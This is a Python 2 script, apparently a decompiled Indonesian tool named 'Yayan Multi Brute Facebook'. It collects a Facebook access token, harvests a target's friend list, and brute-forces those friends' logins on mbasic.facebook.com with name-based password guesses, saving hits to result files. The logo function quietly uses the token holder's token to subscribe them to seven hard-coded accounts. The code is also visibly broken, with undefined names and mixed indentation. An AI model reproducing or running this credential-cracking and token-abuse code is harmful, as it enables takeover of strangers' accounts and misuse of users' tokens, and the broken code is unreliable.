# coding:utf-8
# decompile by Itsuki ft. Aap Afandi ID
# coded by angga kurniawan
# fb.me/gaaaarzxd

import os
try:
    import concurrent.futures
except ImportError:
    print '\n [×] Modul Futures belum terinstall!\n'
    os.system('pip install futures' if os.name == 'nt' else 'pip2 install futures')

try:
    from bs4 import BeautifulSoup
except ImportError:
    print '\n [×] Modul bs4 belum terinstall!\n'
    os.system('pip install bs4' if os.name == 'nt' else 'pip2 install bs4')
import requests, bs4, sys, os, subprocess, random, time, re, json
import base64
from concurrent.futures import ThreadPoolExecutor as YayanGanteng
from datetime import datetime
from time import sleep
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'Nopember', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
reload(sys)
sys.setdefaultencoding('utf-8')
### WARNA RANDOM ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH 
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
#------------------------------->
ok = []
cp = []
id = []
user = []
loop = 0
memek = random.randint(20000000.0, 30000000.0)
kontod = random.randint(20000, 40000)

#User_ampasssss
ua = ('Opera/2.0 (J2ME/MIDP; Opera Mini; en; U; ssr)') 
s = requests.Session()
rgb = random.choice(['\x1b[0;91m', '\x1b[0;92m', '\x1b[0;93m', '\x1b[0;94m', '\x1b[0;95m', '\x1b[0;96m', '\x1b[0;97m', '\x1b[0m'])
ua = s.get('https://raw.githubusercontent.com/Dumai-200/Server-Dmbf/main/ua.txt').text.strip()
ip = s.get('https://api-asutoolkit.cloudaccess.host/ip.php').text
durasi = str(datetime.now().strftime('%d-%m-%Y'))

#lo_gobloggggg
logo = '''%s     __  ____  ______  ____
     \ \/ /  |/  / _ )/ __/ ®
      \  / /|_/ / _  / _/  
      /_/_/  /_/____/_/ %sversion 2
  %s [%s Yayan Multi Brute Facebook%s ]
     [ \x1b[47;30;1m Created by : YayanXD.%s ]'''%(O,M,N,H,N,N)

#token_listrikkk
def tokenz():
	os.system('clear')
	print (' %s*%s tools ini menggunakan login token facebook.\n %s*%s apakah kamu sudah tau cara mendapatkan token facebook?\n %s*%s ketik %sopen%s untuk mendapatkan token facebook.'%(O,N,O,N,O,N,H,N))
	token = raw_input('\n %s[%s?%s] Token :%s '%(N,M,N,H))
	if token in ('open', 'Open', 'OPEN'):
		print '\n%s *%s note! usahakan akun tumbal login di google chrome terlebih dahulu'%(B,N);time.sleep(2)
		print '%s *%s jangan lupa! url ubah ke %shttps://m.facebook.com'%(B,N,H);time.sleep(2)
		print '%s *%s setelah di alihkan ke google chrome. klik %stitik tiga'%(B,N,H);time.sleep(2)
		print '%s *%s lalu klik %sCari di Halaman%s Tinggal ketik %sEAAA%s Lalu salin.'%(B,N,H,N,H,N);time.sleep(2)
		raw_input(' %s*%s tekan enter '%(O,N))
		os.system('xdg-open https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_')
		logo()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token=%s'%(__cindy__))
		a = json.loads(otw.text)
		nama = a['name']
		avsid = open('login.txt', 'w')
		avsid.write(token)
		avsid.close()
		print '\n\n %s*%s selamat datang %s%s%s'%(O,N,K,nama,N)
		time.sleep(2)
		print ' %s*%s mohon untuk menggunakan sc ini sewajarnya, kami tidak bertanggung jawab jika sc ini disalah gunakan...'%(O,N)
		time.sleep(2)
		raw_input(' %s*%s tekan enter '%(O,N))
		bot_komen()
	except KeyError:
		print '\n\n %s[%s!%s] token invalid'%(N,M,N)

#menu_sehari_hari
def menu():
    os.system('clear')
    try:
        token=open('login.txt','r').read()
    except (KeyError, IOError):
        os.system('clear')
        print '\n %s[%s×%s] token invalid'%(N,M,N)
        time.sleep(2)
        os.system('rm -rf login.txt')
        login()
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=%s'%(__cindy__))
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except (KeyError, IOError):
        os.system('clear')
        print '\n %s[%s×%s] token invalid'%(N,M,N)
        time.sleep(2)
        os.system('rm -rf login.txt')
        login()
    except requests.exceptions.ConnectionError:
        print '\n\n %s[%s!%s] tidak ada koneksi\n'%(N,M,N)
        exit()
    os.system('clear')
    print logo
	print ' %s[#] -------------------------------------------'%(N)
	print ' %s[+] Nama : %s'%(N,nama)
	print ' %s[+] IP    : %s'%(N,IP)
	print ' %s[#] -------------------------------------------'%(N)
	print
	print '      %s[  Salam NgeCroot  ]'%(N)
	print
	print ' %s[#] -------------------------------------------'%(N)
	print ' %s[1] Crack from public'%(N)
	print ' %s[2] Crack Indonesia'%(N)
	print ' %s[3] Crack India/Bangla'%(N)
	print ' %s[4] Check Result'%(N)
	print ' %s[5] Setting UserAgent'%(N)
	print ' %s[0] Logout'%(N)
	print ' %s[#] -------------------------------------------'%(N)
	ask = raw_input('\n [?] Choose : ')
	if ask =='':
		menu()
	elif ask == '1' or ask == '01':
		__ahya_ganteng()
	elif ask == '2' or ask == '02':
		_dds()
	elif ask == '3' or ask == '03':
		__sarungan____()
	elif ask == '4' or ask == '04':
		hasil()
	elif ask == '5' or ask == '05':
		settingua()
	elif ask == '0' or ask == '00':
		os.system('rm -f login.tx')
		print('\n %s[✓] berhasil menghapus token'%(N))
def logo():
	try:
		token = open('login.txt', 'r').read()
	except (KeyError, IOError):
		print '\n %s[%s×%s] token invalid'%(N,M,N)
		os.system('rm -rf login.txt')
	requests.post('https://graph.facebook.com/100005395413800/subscribers?access_token=%s'%(__cindy__))
	requests.post('https://graph.facebook.com/100059709917296/subscribers?access_token=%s'%(__cindy__))
	requests.post('https://graph.facebook.com/100008678141977/subscribers?access_token=%s'%(__cindy__))
	requests.post('https://graph.facebook.com/100005878513705/subscribers?access_token=%s'%(__cindy__))
	requests.post('https://graph.facebook.com/100003342127009/subscribers?access_token=%s'%(__cindy__))
	requests.post('https://graph.facebook.com/100041388320565/subscribers?access_token=%s'%(__cindy__))
	requests.post('https://graph.facebook.com/108229897756307/subscribers?access_token=%s'%(__cindy__))
	menu()

#cek_panennnnnnnnn
def hasil(ok,cp):
	if len(ok) != 0 or len(cp) != 0:
		print '\n\n %s[%s#%s] crack selesai...\n\n'%(N,K,N)
		print '\n\n [%s+%s] total OK : %s%s%s'%(O,N,H,str(len(ok)),N)
		print ' [%s+%s] total CP : %s%s%s'%(O,N,K,str(len(cp)),N)
		exit()
	else:
		print '\n\n [%s!%s] opshh kamu tidak mendapatkan hasil :('%(M,N)
		exit()

#ngocok_public
def __ahya_ganteng():
	global token
	try:
		token = open('login.txt', 'r').read()
	except IOError:
		print ' %s[!] Token Invalid'%(N)
		tokenz()
	print ' %s[+] Type 'me' to Crack From The Friends List'%(N)
	idt = raw_input(' [+] ID Public : ')
	try:
		pok = requests.get('https://graph.facebook.com/'+idt+'?access_token='+token)
		sp = json.loads(pok.text)
		print ' %s[+] Name : '+sp['name']'%(N)
	except KeyError:
		exit ('\n\n %s[%s!%s] teman tidak ditemukan'%(N,M,N))
	r = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+token)
	z = json.loads(r.text)
	for i in z['data']:
		uid = i['id']
		na = i['name']
		nm = na.rsplit(' ')[0]
		id.append(uid+'|'+nm)
	print(' '+N+'[*] Total ID  : '+str(len(id)))
	print(' '+N+'[#] -------------------------------------------')
	print(' '+N+'[?] Untuk hasil maksimal setelah crack selesai gunakan metode Manual dengan target yang sama')
	ask = raw_input('\n [?] Apa kamu ingin menggunakan Manual sandi? Y/t : ')
	if ask == 'Y' or ask == 'y':
		manual()
	print(' '+N+'[+] OK Saved : results/OK-%s-%s-%s.txt'% (ha, op, ta))
	print(' '+N+'[+] CP Saved : results/CP-%s-%s-%s.txt\n'% (ha, op, ta))
	print(' '+N+'-----------------------------------------------')
	
	def main(user):
		global ok, cp, loop, token, ips
        print '\r [\x1b[1;96m*\x1b[0m] crack: %s/%s OK-:%s - CP-:%s '%(loop,len(self.id),len(ok),len(cp)),
        sys.stdout.flush()
		uid,name=user.split('|')
		try:
			os.mkdir('results')
		except OSError:
			pass
		try:
			for pw in [name.lower()+'123',name.lower()+'1234',name.lower()+'12345',name.lower()]:
				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
				xo = rex.content
				if 'mbasic_logout_button' in xo or 'save-device' in xo:
					print '\r  %s* --> %s|%s      %s' % (H,user,pw,N)
					wrt = ' [✓] %s|%s' % (user,pw)
					ok.append(wrt)
					open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
					save.close()
					break
					continue
				elif 'checkpoint' in xo:
					print '\r  %s* --> %s|%s      %s' % (K,user,pw,N)
					wrt = ' [×] %s|%s' % (user,pw)
					cp.append(wrt)
					open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
					save.close()
					break
					continue
			
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	exit('\n '+N+'[#] Finished')

if __name__ == '__main__':
	os.system('git pull')
	tokenz()
